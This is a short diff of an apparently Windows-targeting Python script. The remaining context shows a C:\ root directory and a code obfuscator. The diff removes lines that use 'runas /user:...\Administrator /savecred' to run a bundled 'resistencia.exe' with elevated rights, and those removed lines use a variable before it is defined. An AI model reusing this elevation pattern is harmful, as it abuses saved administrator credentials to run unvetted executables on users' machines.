@@ -5,10 +5,6 @@ import win32con
 import win32gui
 import random
 
-PC_NAME = os.environ['COMPUTERNAME']
-RESISTENCIA_DIR = THIS_DIR + "\\dist\\resistencia.exe"
-os.system(f"runas /user:{PC_NAME}\\Administrator /savecred {RESISTENCIA_DIR}")
-
 ROOTDIR = r"C:\\"
 THIS_DIR = os.path.dirname(os.path.realpath(__file__))
 FUSCATE_DIR = THIS_DIR + "\\py-fuscate.py"
